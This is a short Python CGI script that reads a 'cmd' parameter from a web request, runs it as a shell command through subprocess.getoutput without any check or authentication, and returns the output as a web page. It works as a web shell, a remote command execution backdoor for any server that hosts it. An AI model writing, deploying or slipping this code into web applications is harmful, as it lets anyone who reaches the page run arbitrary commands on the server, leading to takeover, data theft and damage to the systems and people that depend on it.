#!/usr/bin/python3

print("content-type:text/html\n")

import os
import cgi
import subprocess

form=cgi.FieldStorage()
p=form.getvalue("cmd")
x=subprocess.getoutput(p)
print(x) 
